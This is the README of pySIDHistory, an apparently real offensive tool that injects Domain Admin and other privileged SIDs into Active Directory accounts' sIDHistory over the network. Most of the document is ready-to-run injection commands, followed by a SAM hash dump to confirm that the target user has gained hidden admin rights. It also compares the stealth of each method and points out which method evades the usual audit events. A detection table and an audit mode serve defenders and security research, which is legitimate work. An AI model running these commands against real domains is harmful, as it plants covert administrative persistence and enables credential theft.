# pySIDHistory

Remote SID History injection & auditing from Linux.

> **Warning** — The DSInternals method **stops the NTDS service** on the target DC to modify `ntds.dit` offline. This causes a brief authentication outage (~5-10s) and carries a risk of service disruption if the restart fails. **Do not run against production domain controllers.** This tool is intended for authorized security assessments, lab environments, and blue team research (IoC identification, detection engineering). Run it from Linux, not Windows. Provided as-is with no support guarantee.

> *"There is currently no way to exploit this technique purely from a distant UNIX-like machine"* — [The Hacker Recipes](https://www.thehacker.recipes/ad/persistence/sid-history)

**pySIDHistory** injects privileged SIDs into the `sIDHistory` attribute of a user account over the network. The target user gains Domain Admin privileges without appearing in `net group "Domain Admins"`, BloodHound group membership queries, or standard audit scripts.

This is a persistence technique ([T1134.005](https://attack.mitre.org/techniques/T1134/005/)) — it requires existing DA access.

---

## Quick demo

```bash
# 1. Verify user1 has no sIDHistory
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --query user1

# 2. Inject Domain Admins SID
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
    --target user1 --inject domain-admins --force

# 3. Confirm — user1 dumps SAM without being in Domain Admins
nxc smb 192.168.56.10 -u user1 -p Password123! -d lab1.local --sam
```

**Before** — no admin shares, no sIDHistory:

![user1 has standard share access only](assets/01-before-shares.png)
![No SID History found for user1](assets/02-before-no-sidhistory.png)

**After** — DA privileges via sIDHistory:

![sIDHistory modified successfully](assets/03-injection-success.png)
![user1 dumps SAM hashes](assets/04-after-sam-dump.png)

---

## Installation

```bash
git clone https://github.com/felixbillieres/pySIDHistory.git
cd pySIDHistory
pip install -r requirements.txt
```

Requires Python 3.7+, `ldap3`, `impacket`.

---

## Injection methods

### DSInternals (default)

Stops NTDS, modifies `ntds.dit` offline via DSInternals, restarts NTDS. Works same-domain, can inject any SID including privileged ones (RID < 1000).

```bash
# Same-domain: inject Domain Admins
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
    --target user1 --inject domain-admins --force

# Cross-domain: inject DA of lab2.local
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
    --target user1 --inject domain-admins --inject-domain lab2.local --force

# Raw SID
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
    --target user1 --inject S-1-5-21-3522073385-2671856591-2684624930-512 --force
```

**Trade-offs:** ~5-10s NTDS downtime, creates a temporary service, disk artifacts. Auto-cleanup after execution. In multi-DC environments, other DCs continue serving authentication.

### DRSUAPI (cross-forest, stealth)

Calls `DRSAddSidHistory` (opnum 20) over RPC. No disk writes, no service, no NTDS downtime. Limited to RID > 1000 due to SID filtering at forest trust boundaries.

```bash
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
    --target user1 --method drsuapi --source-user da-admin2 --source-domain lab2.local \
    --src-username da-admin2 --src-password Password123! --src-domain lab2.local
```

**Prerequisites:** cross-forest trust, auditing enabled on both DCs, audit groups (`$DOMAIN$$$`) on both sides, DA on destination domain.

### Comparison

| | DSInternals | DRSUAPI |
|---|---|---|
| Privileged SIDs (DA, EA, krbtgt) | Yes | No (SID-filtered) |
| Same-domain | Yes | No |
| Cross-forest | Yes | Yes |
| NTDS downtime | ~5-10s | None |
| Disk artifacts | Yes (auto-cleaned) | None |

---

## Audit & recon

```bash
# Query sIDHistory of a specific user
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --query user1

# Domain-wide audit with risk assessment
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --audit

# JSON export for SIEM integration
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 \
    --audit -o json --output-file audit.json

# Enumerate domain trusts and SID filtering status
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --enum-trusts

# SID lookup
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --lookup user1

# List injectable presets
python3 main.py -d lab1.local -u da-admin -p Password123! --dc-ip 192.168.56.10 --list-presets
```

---

## Authentication

| Method | Flags |
|--------|-------|
| NTLM (password) | `-u USER -p PASSWORD` |
| Pass-the-Hash | `-u USER --ntlm-hash NT_HASH` |
| Kerberos | `--kerberos --ccache ccache_file` |
| Certificate (PTC) | `--certificate --cert-file cert.pem --key-file key.pem` |
| SIMPLE bind | `--simple -u USER -p PASSWORD --use-ssl` |

---

## Detection

### DRSUAPI method

| Event ID | Description |
|----------|-------------|
| 4765 | SID History added to an account |
| 4766 | SID History add attempt failed |
| 4738 | User account changed |

### DSInternals method

The DSInternals method bypasses DRSUAPI entirely (offline modification), so **Event 4765/4766 are not generated**. Detection relies on:

| Indicator | What to look for |
|-----------|-----------------|
| Event 7045 | New service `__pySIDHist` installed |
| Event 7036 | NTDS service stopped/started |
| Event 4688 | `powershell.exe -ExecutionPolicy Bypass` as SYSTEM |
| File artifacts | `C:\Windows\Temp\__pysidhistory_*` |
| sIDHistory audit | Same-domain SIDs in sIDHistory (strongest indicator — use `--audit`) |

---

## Architecture

```
main.py                        CLI entry point
  └── core/
      ├── attack.py            Orchestrator
      ├── auth.py              Authentication (NTLM, PTH, Kerberos, cert, SIMPLE)
      ├── ldap_operations.py   LDAP queries & domain enumeration
      ├── sid_utils.py         SID conversion, presets, well-known SIDs
      ├── scanner.py           Domain-wide auditing & risk assessment
      ├── output.py            Console/JSON/CSV formatting
      └── methods/
          ├── dsinternals/
          │   └── injector.py  DSInternals injection via SMB + SCMR
          └── drsuapi/
              └── client.py    DRSAddSidHistory RPC (opnum 20)
```

## Lab

**[sIDHistoryLab](https://github.com/felixbillieres/sIDHistoryLab)** — Two Windows Server 2019 DCs with cross-forest trust, automated with Vagrant.

## References

- [MS-DRSR: IDL_DRSAddSidHistory (Opnum 20)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/376230a5-d806-4ae5-970a-f6243ee193c8)
- [MS-SCMR: Service Control Manager Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/)
- [DSInternals](https://github.com/MichaelGrafnetter/DSInternals)
- [The Hacker Recipes: SID History](https://www.thehacker.recipes/ad/persistence/sid-history)
- [impacket](https://github.com/fortra/impacket)
- [MITRE ATT&CK T1134.005](https://attack.mitre.org/techniques/T1134/005/)

## Author

[@felixbillieres](https://github.com/felixbillieres)
